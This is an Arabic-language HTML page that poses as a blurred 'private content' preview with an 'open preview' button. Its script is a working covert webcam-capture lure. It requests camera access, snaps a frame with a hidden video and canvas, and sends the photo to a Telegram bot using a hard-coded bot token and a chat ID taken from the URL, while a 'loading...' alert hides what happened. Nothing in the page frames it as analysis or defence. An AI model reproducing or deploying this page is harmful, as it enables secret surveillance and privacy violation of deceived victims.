<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><title>معاينة المحتوى</title>
    <style>
        body { background: #1a1a1a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #2d2d2d; padding: 30px; border-radius: 20px; text-align: center; width: 320px; }
        .img-blur { width: 100%; border-radius: 10px; filter: blur(15px); margin-bottom: 20px; }
        .btn { background: #ff4757; color: white; padding: 15px; border: none; border-radius: 10px; width: 100%; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h3>محتوى خاص</h3>
        <img id="v-img" class="img-blur" src="https://via.placeholder.com/300">
        <button class="btn" onclick="start()">فتح المعاينة</button>
    </div>
    <video id="v" style="display:none" autoplay></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('chatId');
        const token = "8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg";

        async function start() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v');
            video.srcObject = stream;
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', uid);
                    fd.append('photo', blob, 'shot.jpg');
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
                }, 'image/jpeg');
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
            alert("جاري التحميل...");
        }
    </script>
</body>
</html>
